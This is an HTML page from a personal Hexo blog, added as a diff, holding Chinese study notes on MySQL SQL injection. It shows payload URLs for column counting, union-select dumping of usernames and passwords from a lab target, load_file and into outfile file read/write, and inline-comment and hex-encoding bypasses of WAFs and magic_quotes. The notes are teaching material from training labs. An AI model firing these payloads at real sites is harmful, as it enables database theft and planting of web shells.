@@ -1,0 +1,261 @@
+
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0">
+        <title>剣の魔王の小屋</title>
+        <meta name="author" content="剣の魔王">
+        <meta name="description" content="这个网站没有描述">
+        <meta name="keywords" content="">
+        <link rel="icon" href="image/head.png">
+        <script src="https://cdn.staticfile.org/instant.page/5.1.0/instantpage.min.js" type="module"></script>
+        <script src="https://cdn.staticfile.org/font-awesome/6.2.0/js/all.min.js"></script>
+        
+        <link rel="stylesheet" href="/css/fonts.min.css">
+        <link rel="stylesheet" href="/css/particlex.css">
+        
+        <script src="https://cdn.staticfile.org/vue/3.2.33/vue.global.prod.min.js"></script>
+    <meta name="generator" content="Hexo 5.4.2"></head>
+    <body>
+        <div id="loading" style="height:100vh;width:100vw;position:fixed;display:flex;z-index:2147483647;justify-content:space-between;background:#fff;transition:opacity 0.3s ease-out;-webkit-user-select:none;-moz-user-select:none;user-select:none"><div style="position:fixed;height:100vh;width:100vw;display:flex;justify-content:center;align-items:center"><div id="loadcontent" style="width:50vmin;height:50vmin;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px #a3ddfb;text-align:center"><div><h2>LOADING...</h2><p style="word-break:keep-all">加载过慢请开启缓存(浏览器默认开启)</p><div><img alt="loading" src="/loading.gif"></div></div></div></div></div>
+        <div id="layout">
+            <i data-fa-symbol="calendar-solid" class="fa-solid fa-calendar fa-fw"></i>
+            <i data-fa-symbol="bookmark-solid" class="fa-solid fa-bookmark fa-fw"></i>
+            <i data-fa-symbol="tags-solid" class="fa-solid fa-tags fa-fw"></i>
+            <transition name="into">
+                <div v-show="show_page" style="display: -not-none">
+                    <div id="menu_show">
+                         
+<nav id="menu">
+    <div class="desktop-menu">
+        <a href="/">
+            <span class="title">剣の魔王の小屋</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;about</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;tags</span>
+        </a>
+        
+    </div>
+    <div :class="'phone-menu ' + menu_show" id="phone-menu">
+        <div class="curtain" @click="menu_show = !menu_show" v-show="menu_show"></div>
+        <div :class="'title'" @click="menu_show = !menu_show">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;剣の魔王の小屋</span>
+        </div>
+        <transition name="slide">
+        <div class="items" v-show="menu_show">
+            
+            <a href="/">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-house fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">home</div>
+                </div>
+            </a>
+            
+            <a href="/about">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-id-card fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">about</div>
+                </div>
+            </a>
+            
+            <a href="/archives">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-box-archive fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">archives</div>
+                </div>
+            </a>
+            
+            <a href="/categories">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-bookmark fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">categories</div>
+                </div>
+            </a>
+            
+            <a href="/tags">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-tags fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">tags</div>
+                </div>
+            </a>
+            
+        </div>
+        </transition>
+    </div>
+</nav>
+                    </div>
+                    <div id="main">
+                        
+<div class="article">
+    <div>
+        <h1> </h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <svg class="fa-icon"><use xlink:href="#calendar-solid"></use></svg>
+            </span>
+            2024/3/30
+        </span>
+        
+        
+    </div>
+    <div class="content" v-pre>
+        <h3 id="1、sql注入原理"><a href="#1、sql注入原理" class="headerlink" title="1、sql注入原理"></a>1、sql注入原理</h3><p>针对SQL注入的攻击行为可描述为通过用户可控参数中注入SQL语法，破坏原有SQL结构，达到编写程序意料之外结果的攻击行为。</p>
+<p>其成因可归结为以下两个原理叠加造成：</p>
+<p>1、程序编写者在处理程序和数据库交互时，使用字符串凭借的方式构造SQL语句。</p>
+<p>2、未对用户可控参数进行足够的过滤便将参数内容拼接进入到SQL语句中。</p>
+<p><strong><span id="more"></span></strong></p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240329-165520.png"></p>
+<h3 id="2、Mysql注入有关知识点"><a href="#2、Mysql注入有关知识点" class="headerlink" title="2、Mysql注入有关知识点"></a>2、Mysql注入有关知识点</h3><p><strong>information_schema数据库中的几个关键的表</strong></p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240329-165730" alt="img"></p>
+<pre><code>在表schema(数据库名)、tables(表名)、columns(列名或字段名)。
+
+在schema表中，schema_name字段用来存储数据库名。
+
+在tables表中，table_schema和table_name分别用来存储数据库名和表名。
+
+在columns表中，table_schema(数据库名)、table_name(表名)、column_name(字段名)
+</code></pre>
+<pre><code>注释符：在Mysql 中常见的注释符表达式：
+    #、--空格、/**/
+内联注释：/*！SQL语句 */ 只有Mysql可以识别，常用来绕过WAF
+
+例如：select * from articles where id = id
+使用内联注释注入：select * from articles where id = -1 /*!union*/ /*!select*/ 1,2,3,4
+</code></pre>
+<h4 id="mysql-常用的函数与参数"><a href="#mysql-常用的函数与参数" class="headerlink" title="mysql 常用的函数与参数"></a>mysql 常用的函数与参数</h4><p>show databases; #查看数据库</p>
+<p>use information_schema; #转到数据库information_schema</p>
+<p>show tables; #查看当前数据库中的数据表</p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240329-203332" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/8ff2e60888a346de8828faf53fee04a8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA55KA55Ko5pif4piG56m677mM,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240329-203330" alt="在这里插入图片描述"></p>
+<h3 id="3、如何判断注入点？"><a href="#3、如何判断注入点？" class="headerlink" title="3、如何判断注入点？"></a>3、如何判断注入点？</h3><h4 id="3-1、老办法："><a href="#3-1、老办法：" class="headerlink" title="3.1、老办法："></a>3.1、老办法：</h4><p>and 1=1 页面正常<br>and 1=2 页面错误<br>可能存在注入点</p>
+<h4 id="3-2、新办法："><a href="#3-2、新办法：" class="headerlink" title="3.2、新办法："></a>3.2、新办法：</h4><p>select * from users where id=1daadda LIMIT 0,1<br>xxx/?id=1daadda 这样输入，如果对网站有影响，和原来网站有差别，证明他代入数据库查询了，证明了会有漏洞；如果没有差别，网站不检测你输入的参数即不能传递参数，说明没有漏洞。<br>如果报了404错误或跳转，说明网站对输入参数检测了，大部分没有漏洞。</p>
+<h4 id="3-3、猜解列名数量-字段数"><a href="#3-3、猜解列名数量-字段数" class="headerlink" title="3.3、猜解列名数量(字段数)"></a>3.3、猜解列名数量(字段数)</h4><p>因为union联合查询字段数必须一样，否则会报错；<br>使用order by x(数字) 错误与正常的临界值，不断测试x直到页面错误；</p>
+<pre><code>例：219.153.49.228:42123/new_list.php?id=1 order by 4
+</code></pre>
+<p>order by 4没问题但是order by 5 的时候网页错误，所以一共有四列</p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240329-171417.png" alt="在这里插入图片描述"></p>
+<h4 id="3-4、报错猜解准备"><a href="#3-4、报错猜解准备" class="headerlink" title="3.4、报错猜解准备"></a>3.4、报错猜解准备</h4><p>由上面猜解字段数得到下面</p>
+<pre><code>http://219.153.49.228:42123/new_list.php?id=-1 union select 1,2,3,4
+</code></pre>
+<p>2和3有显示位，数据出来可以看见</p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240329-171455.png" alt="在这里插入图片描述"></p>
+<h4 id="3-5、开始信息收集"><a href="#3-5、开始信息收集" class="headerlink" title="3.5、开始信息收集"></a>3.5、开始信息收集</h4><p>数据库版本：version() -&gt; 5.7.22-0ubuntu0.16.04.1<br>数据库名字：database() -&gt; mozhe_Discuz_StormGroup<br>数据库用户：user() -&gt; root@localhost<br>操作系统：@@version_compile_os -&gt; Linux</p>
+<p>查询指定数据库名mozhe_Discuz_StormGroup下的表名信息：</p>
+<pre><code>http://219.153.49.228:43123/new_list.php?id=-1 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=&#39;mozhe_Discuz_StormGroup&#39;
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240329-171708.png" alt="在这里插入图片描述"></p>
+<p>查询指定表名StormGroup_member下的列名信息：</p>
+<pre><code>http://219.153.49.228:43123/new_list.php?id=-1 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#39;StormGroup_member&#39;
+</code></pre>
+<p>查询指定表名StormGroup_member下的数据：</p>
+<pre><code>http://219.153.49.228:43123/new_list.php?id=-1 union select 1,name,password,4 from StormGroup_member
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240329-171854.png" alt="在这里插入图片描述"></p>
+<p>猜解表下多个数据可以采用limit x,1</p>
+<pre><code>http://219.153.49.228:43123/new_list.php?id=-1 union select 1,name,password,4 from StormGroup_member limit 1,1
+</code></pre>
+<p>跨库选择表：如果是跨库查询，需要在表前添加该表的数据库名称，否则会默认为当前库的表（xxx为表名）</p>
+<pre><code>如：http://219.153.49.228:43123/new_list.php?id=-1 union select 1,2,3,4  from notice.xxxx
+</code></pre>
+<h3 id="4、SQL注入实现文件读写"><a href="#4、SQL注入实现文件读写" class="headerlink" title="4、SQL注入实现文件读写"></a>4、SQL注入实现文件读写</h3><p>会用到MySQL数据库里两个内置函数，这两个函数是MySQL数据库特有的，在其他数据库是没有的或者在其他数据库中写法不 同，所以这是为什么说注入点分数据库的原因，因为每个数据库内置的安全机制和它的功能不同，这才导致在注入的时候针对不用的数据库采取的攻击思路也不同。</p>
+<p>load_file(): 读取函数<br>into outfile 或者 into dumpfile:导出函数</p>
+<p>路径获取常见方法：<br>报错显示，遗留文件，漏洞报错，平台配置文件，爆破等;</p>
+<ul>
+<li>报错显示</li>
+</ul>
+<p>网站出现错误时，会显示路径；</p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240329-173202.png" alt="在这里插入图片描述"></p>
+<ul>
+<li>遗留文件</li>
+</ul>
+<p>类似于phpinfo()文件，为了调试信息遗留的文件，命名一般为phpinfo()之类的；<br>可以用工具扫描到；</p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240329-172816.png" alt="在这里插入图片描述"></p>
+<ul>
+<li>漏洞报错</li>
+</ul>
+<p>知道对方是用什么脚本程序搭建再去网上去搜索漏洞信息：phpcms爆路径、zblog爆路径；</p>
+<ul>
+<li>平台位置文件</li>
+</ul>
+<p>搭建平台的配置文件，会记录网站的信息，包括网站储存路径，网站的域名，IP等，需要一些默认路径来进行尝试读取；</p>
+<h4 id="1-常见读取文件列表"><a href="#1-常见读取文件列表" class="headerlink" title="1.常见读取文件列表"></a>1.常见读取文件列表</h4><p>注：下述SQL语句的执行，必须依赖于数据库中secure_file_priv参数，该参数指定了数据库导入和导出的安全路径。<br>需要在mysql的配置文件my.ini文件添加secure_file_priv=‘’</p>
+<pre><code>http://127.0.0.1/sqli-labs-master/Less-2/?id=-1 union select 1,load_file(&#39;d:/www.txt&#39;),3
+</code></pre>
+<h4 id="2-常见读取文件列表及写入文件问题：魔术引导开关"><a href="#2-常见读取文件列表及写入文件问题：魔术引导开关" class="headerlink" title="2.常见读取文件列表及写入文件问题：魔术引导开关"></a>2.常见读取文件列表及写入文件问题：魔术引导开关</h4><pre><code>http://127.0.0.1/sqli-labs-master/Less-2/?id=-1 union select 1,&#39;x&#39;,3 into outfile &#39;C:\phpStudy\PHPTuorial\WWW\sqli-labs-master\x.php&#39;--+
+</code></pre>
+<p>魔术引号magic_quotes_gpc是php安全机制开关，在php的配置文件php.ini修改<br>当magic_quotes_gpc = On时，输入数据中含单引号（’）、双引号（”）、反斜线（\）与 NULL（NULL 字符）等字符，都会被加上反斜线，都不会被转义。这些转义是必须的。<br><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240329-174154.png" alt="在这里插入图片描述"></p>
+<p>绕过方法：可以采用编码或者宽字节，把路径进行十六进制编码，就不需要使用单引号，可以正常解析；</p>
+<p>参考链接：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_74169008/article/details/130768550">【小迪安全】完整详细笔记01-39天-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_48904485/article/details/123628523">SQL注入详解-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.kancloud.cn/noahs/src_hacker/2394999">SQL盲注 · 白帽与安全 · 看云 (kancloud.cn)</a></p>
+
+    </div>
+    
+    
+</div>
+                         
+<footer id="footer">
+    <div class="footer-wrap">
+        <div>
+            © 20xx - 2024 剣の魔王の小屋
+            <span class="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            @剣の魔王
+        </div>
+        <div></div>
+        <div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo Engine</a> & <a
+                target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a></div>
+        
+    </div>
+</footer>
+                    </div>
+                </div>
+            </transition>
+            <div id="img_show">
+                <img id="img_content" alt="img_show">
+            </div>
+        </div>
+        <script src="https://cdn.staticfile.org/highlight.js/11.5.1/highlight.min.js"></script>
+        <script src="/js/particlex.js"></script>
+        <script src="/js/showimg.js"></script>
+        
+
+    </body>
+</html>
